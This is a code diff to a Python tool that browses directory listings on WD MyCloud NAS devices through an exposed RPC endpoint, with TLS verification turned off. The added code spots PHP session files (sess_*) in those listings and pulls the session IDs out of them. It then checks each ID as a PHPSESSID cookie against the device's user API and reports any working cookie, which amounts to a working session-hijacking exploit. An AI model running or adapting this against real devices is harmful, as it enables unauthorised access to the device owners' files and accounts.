@@ -11,6 +11,7 @@ try:
 except:
         print "Colorama not found! Run $ pip install colorama"
         sys.exit()
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
 
@@ -95,6 +96,16 @@ def serverInfo(host, port):
                                 print (Fore.GREEN + "Videos shared: {0}".format(videoCount))
         return versionNumber
 
+def checkSessionCookie(host, cookieString):
+        url = "http://{0}/api/2.1/rest/device_user".format(host)
+        cookieTemp = cookieString.split("_")
+        cookie = {'PHPSESSID': cookieTemp[1]}
+        response = requests.get(url, timeout=10, cookies=cookie)
+        if response.status_code == 200:
+                return cookie
+        else:
+                return False
+
 def browser(host, port, version):
         while True:
                 var = raw_input("path nr: ")
@@ -112,6 +123,7 @@ def browser(host, port, version):
                                         url = "https://{0}:{1}/rpc/dir/path={2}".format(host, port, var)
                                 response = requests.get(url, timeout=5, verify=False)
                         print "-" * 30
+                        validCookieString = ""
                         for line in response.iter_lines():
                                 if line :
                                         if len(line) > 3:
@@ -125,14 +137,22 @@ def browser(host, port, version):
                                                         line = line[:4].replace("F", " Fil ") + line[4:]
                                                         if keywordDetector(line[4:]):
                                                                 print (Fore.RED + line)
+                                                        elif line[8:13] == "sess_":
+                                                                print line
+                                                                validCookie = checkSessionCookie(host, line[8:])
+                                                                if validCookie != False:
+                                                                        validCookieString = validCookie
                                                         else:
                                                                 print line
                                                 else:
                                                         print line
+                        if len(validCookieString) >= 1:
+                                print (Fore.RED + "Valid WDMyCloud cookie discovered: {0}".format(validCookieString))
                         print "-" * 30
                 elif var == "exit":
                         sys.exit()
 
+#*** Program start here ***
 if __name__ == '__main__':
         if len(sys.argv) != 3:
                 print "Usage: $ " + sys.argv[0] + " [IP_adress] [port]"
